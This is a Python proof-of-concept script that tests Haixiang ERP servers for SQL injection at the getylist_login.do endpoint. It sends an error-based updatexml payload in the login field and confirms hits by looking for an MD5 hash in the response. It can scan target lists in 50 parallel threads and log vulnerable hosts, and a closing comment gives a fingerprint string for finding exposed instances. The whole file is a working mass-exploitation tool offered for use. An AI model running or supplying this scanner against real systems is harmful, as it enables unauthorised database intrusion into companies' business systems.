import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """海翔ERP getylist_login.do SQL注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='海翔ERP getylist_login.do SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/getylist_login.do"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 500 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('海翔ERP_result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

# body="checkMacWaitingSecond"